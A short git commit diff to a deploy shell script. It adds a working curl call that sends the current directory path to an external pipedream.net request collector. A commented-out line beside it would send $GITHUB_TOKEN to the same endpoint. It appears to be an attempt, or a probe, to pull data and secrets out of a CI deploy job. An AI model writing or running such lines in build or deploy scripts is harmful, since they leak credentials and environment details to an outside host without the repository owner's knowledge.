59c3d5510407d1fc7ccdf5c6f8af5c2c9a93daf1
_m <matiasesena@gmail.com>
2021-11-03 13:17:40 -0300

    Update deploy-script.sh

--- deploy-script.sh
+++ deploy-script.sh
@@ -3,7 +3,8 @@
 #curl https://en0liva7dzyvpp.x.pipedream.net?holaaa
 #curl https://en0liva7dzyvpp.x.pipedream.net?token=$GITHUB_TOKEN;#
 
-a = echo $(pwd)
-url = https://en0liva7dzyvpp.x.pipedream.net/ + 
-url = "${url}"+a
-curl url
+a=echo $(pwd)
+url="https://en0liva7dzyvpp.x.pipedream.net?"
+url="$url$a"
+
+curl "$url"
